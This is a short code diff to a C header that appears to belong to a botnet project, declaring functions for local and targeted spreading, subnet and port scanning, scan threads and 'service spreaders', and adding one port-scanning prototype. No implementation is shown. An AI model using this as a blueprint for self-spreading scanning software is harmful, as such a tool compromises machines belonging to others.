@@ -38,6 +38,7 @@ int spread_local(notnet_bot_t *bot);
 int spread_target(notnet_bot_t *bot, notnet_target_t *target);
 int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
 int scan_port(notnet_bot_t *bot, const char *ip, uint16_t port);
+char *scan_ports(const char *target, uint16_t *ports, int port_count);
 int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask);
 
 /* ── Service Spreaders ──────────────────────────────────────── */
